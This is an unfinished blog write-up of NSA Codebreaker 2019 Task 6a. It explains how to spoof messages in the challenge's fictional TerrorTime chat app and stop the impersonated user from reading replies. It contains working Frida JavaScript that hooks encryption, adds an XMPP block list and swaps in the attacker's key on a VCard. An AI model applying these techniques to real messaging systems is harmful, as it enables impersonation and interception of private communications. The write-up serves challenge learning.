---
layout: default
permalink: /CodeBreaker-2019-Task-6a/
title: NSA Codebreaker 2019, Task 6a
---

Task 6a requires you to<br>
- spoof a message and<br>
- prevent spoofed user from reading replies.<br>

How messages work
Half way there since un decrypted are hidden

When sending a message, TerrorTime will encrypt the message content with a symmetric key. This key is then encrypted using the sender's local public keys and the receiver's public keys. **need to verify** It's interesting that only the local public keys are used, and not all of the ones listed on the sender's VCard. The app makes the assumption that if the key is on the user's VCard, then it is also in the user's local copy. This prevents the message key from being encrypted with the spoof user's public key. I could send a message from a spoofed user and verify that it was using my key. When the spoofed user logged in, TerrorTime would not be able to decrypt the message and would ignore the message. 

** pic of message being sent, and the encrypted message **

Unfortunately, the recipient was not able to read the message either. I needed to looker deeper into how the message is decrypted. 

** decryption flow, with failure branches** 

In **Messaging.decryptMessage double check**, after the message is decrypted an internal structure is checked. 

** image of message structure **
** image of internal sturture **

The each user's public key fingerprints in the internal structure are checked to determine if the the message key was encrypted with a corresponding public key. If the internal structure contains a fingerprint that was not used, then TerrorTime treats the message as corrupt and drops it. Interestingly, the app does not check if the public key belongs to the sender or the receiver. Additionally, the message key can be encrypted with a public key that is not recorded in the internal structure. This is why I could send messages without error. 

** image of bad message **

Below if the Javascript I injected into TerrorTime to manipulate the message's internal structure to fix the corrupt issue. The script hooks the Messaging.encryptMessage function and changes the arguments sent to the real function. The client's public key fingerprints list is replaced with the contact's. Now when the contact receives the message, the internal structure only contains fingerprints for their own public keys.

{% highlight javascript %}
console.log("Script loaded successfully ");
Java.perform(function x(){ //Silently fails without the sleep from the python code
    console.log("Inside java perform function");

    var my_class = Java.use("com.badguy.terrortime.crypto.Messaging");
    var Message = Java.use("com.badguy.terrortime.Message");
    my_class.encryptMessage.implementation = function(msg, ckeys, conkeys) { 
        console.log("Edited encrypted message");
        return this.encryptMessage(msg, conkeys, conkeys);
    }
    console.log("Created hooks");
});
{% endhighlight %}

** image of good message **

Removing the spoofed user's public key from their VCard is another method to achieve the same result. The second part of the task can be completed two different ways; only one is checked for by the scoring system. The first method is to add the recipient to the spoofed user's block list. This is not a function provided by the TerrorTime app, but is a function of the XMPP server. The second method is to remove the spoofed user's public key from their VCard. Their public key is added back to the server when the user next logs in, which prevents permentally preventing communication. 

In my opinion, adding the user to a block list is a better method, since it<br>
- has a more grainiar focus,<br>
- enables spoofing while the user is logged in, and<br>
- is less detectable.<br>

Removing the public key has the following downsides,<br>
- blocks all contacts,<br>
- you are unable to control when spoofed user logs back in, and<br>
- is more detectable.<br>

Below is the javascript I injected to add user to blocklist. I had some trouble accessing the Enum PrivacyItem.Type from the JavaScript. This forced me to hook the toMXL function to set the privacyItem values. When a stanza is sent to the XMPP server, the send function will call the function toXML of the object representing the stanza. By hooking this function, I was able to format the XML correctly to block a user. 

{% highlight javascript %}
Java.perform(function x(){ //Silently fails without the sleep from the python code
    console.log("Inside java perform function");
        var TerrorTimeApplication = Java.use("com.badguy.terrortime.TerrorTimeApplication");
        var PrivacyListManager = Java.use("org.jivesoftware.smackx.privacy.PrivacyListManager");
        var PrivacyList = Java.use("org.jivesoftware.smackx.privacy.PrivacyList");
        var PrivacyItem = Java.use("org.jivesoftware.smackx.privacy.packet.PrivacyItem");
        var Type = Java.use("org.jivesoftware.smackx.privacy.packet.PrivacyItem$Type");
        var Enum = Java.use("java.lang.Enum");
        var ArrayList = Java.use("java.util.ArrayList");
        var JidCreate = Java.use("org.jxmpp.jid.impl.JidCreate");
        var AbstractXMPPConnection = Java.use("org.jivesoftware.smack.AbstractXMPPConnection");
        var String = Java.use("java.lang.String");

        PrivacyItem.toXML.implementation = function(){
            var xml = "<item action=\"deny\" type=\"jid\" value=\"zachary--vhost-174@terrortime.app\" order=\"0\"><message/></item>" // Java.cast(this.toXML(), String);
            return this.toXML();
        }

        Java.choose("com.badguy.terrortime.TerrorTimeApplication", {
            onMatch: function(instance) { 
                  try {
                      console.log("Start");
                      var app = Java.cast(instance, TerrorTimeApplication);
                      var conn_object = app.getXMPPTCPConnection().get();
                      var conn = Java.cast(conn_object, AbstractXMPPConnection);
                      console.log("Got Conn");
                      var block_item = Java.cast(PrivacyItem.$new(false, 0), PrivacyItem);
                      block_item.setFilterMessage(true);
                      console.log(block_item.toXML());

                      console.log("Created privacy list");
                      
                      var privacy_list = PrivacyListManager.getInstanceFor(conn);
                      var block_list = ArrayList.$new();
                      block_list.add(block_item); // have to create list with new operator
                      privacy_list.createPrivacyList("Block_to_Leader", block_list);
                      privacy_list.setActiveListName("Block_to_Leader");
                      console.log("Added user to block list: " + "zachary--vhost-174@terrortime.app");
                  } catch(error) {console.log("error: " + error.toString());}
            }, onComplete: function() {} });

});
{% endhighlight %}
** Picture or GIF of this, 3 phones if possible 1 spoofed, one reciever and one me. **

# Removing the public key from VCard #
I used the **savepublickey** function as a template to write JavaScript to remove the spoofed user's public key from their VCard. The below JavaScript will monitor TerrorTime for instances of the class com.badguy.terrortime.TerrorTimeApplication. Once found, the javascript<br>
- retrieves the current instances of VCardManager and XMPPTCPConnection,<br>
- requests the current user's VCard,<br>
- sets the "DESC" to my public key,<br>
- saves the modified VCard.<br>


{% highlight javascript %}
Java.perform(function x(){ //Silently fails without the sleep from the python code
    console.log("Inside java perform function");
        var my_class = Java.use("com.badguy.terrortime.VCardHelper");
        var TerrorTimeApplication = Java.use("com.badguy.terrortime.TerrorTimeApplication");
        var AbstractXMPPConnection = Java.use("org.jivesoftware.smack.AbstractXMPPConnection");
        var VCardManager = Java.use("org.jivesoftware.smackx.vcardtemp.VCardManager");
        var VCard = Java.use("org.jivesoftware.smackx.vcardtemp.packet.VCard");
        var PublicKey = Java.use("java.security.Key");
        var Set = Java.use("java.util.Set");
        var Base64 = Java.use("java.util.Base64");
        var String = Java.use("java.lang.String");
        var JidCreate = Java.use("org.jxmpp.jid.impl.JidCreate");
        var EntityFullJid = Java.use("org.jxmpp.jid.EntityFullJid");
        var EntityBareJid = Java.use("org.jxmpp.jid.EntityBareJid");
        var Jid = Java.use("org.jxmpp.jid.Jid");

       console.log("Start");
        Java.choose("com.badguy.terrortime.TerrorTimeApplication", {
            onMatch: function(instance) { 
                  try {
                      var app = Java.cast(instance, TerrorTimeApplication);
                      var vcard_manager = Java.cast(app.getVCardManager().get(), VCardManager);
                      console.log("Got Manager");
                      var conn_object = app.getXMPPTCPConnection().get();
                      var conn = Java.cast(conn_object, AbstractXMPPConnection);
                      console.log("Got Conn");
                      var user = Java.cast(Java.cast(conn.getUser(), Jid).asEntityBareJidIfPossible(), EntityBareJid);
                      console.log("Got Jid");
                      var my_vcard = Java.cast(vcard_manager.loadVCard(user), VCard);
                      console.log("Got vcard");
                      var new_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6xOaF/SVJiwEDCyHAZouu9wTYven46+o6vb9zNM5RgC2L3CkNKdhP0bDNrJbX9hz3BjwACiR4mYkLqbevjomX7ihD3CUtiNj0zXRDuXrrEFuT3dHURO65Ooyk08GS4cDiSpUejcmX4qeuBuefV08eTVSseLGLB8gLUI3IxZ11CKc7cgTCf763SicwcUEJSBV71IEysOKCCjsbqPAS0rRhgVaSIKs7uWqPUuSIIsIjnBi9/DT18OrAfQHyjW8j/I2mi9Mf6FhlhmpgL3L1W58X+LMHdQYDvoKXyPVhDnTInvCm7P7Xddms9qqCAQulxzlL/6HSC2x4c2Fyw9ZYDVytQIDAQAB\n-----END PUBLIC KEY-----";

                      my_vcard.setField("DESC", new_pub_key);
                      vcard_manager.saveVCard(my_vcard);
                      console.log("Saved VCard");
                  } catch(error) {console.log("error: " + error.toString());}
            }, onComplete: function() {} });

});
{% endhighlight %}

Now when a user replies to the spoofed user, the message key is not encrypted with their public key; preventing decryption. Removing the spoofed user's public key from their VCard fixes both problems, prevents the public key fingerprint from being in the messages internal structure and prevents the spoofed user from reading replies. 


** return this.encryptMessage(msg, conkeys, conkeys); // what happens if the inter clientid is different, set out as kingsley, internal as brian **
** is the internal username used for displaying the name, or is the FROM used? Can we create a man in the middle if the internal is used **
** log in as reciepant and watch for recieved messages, then forward to spoofed user if you want **


![_config.yml]({{ site.baseurl }}/images/codebreaker_2019/task_6/x.png)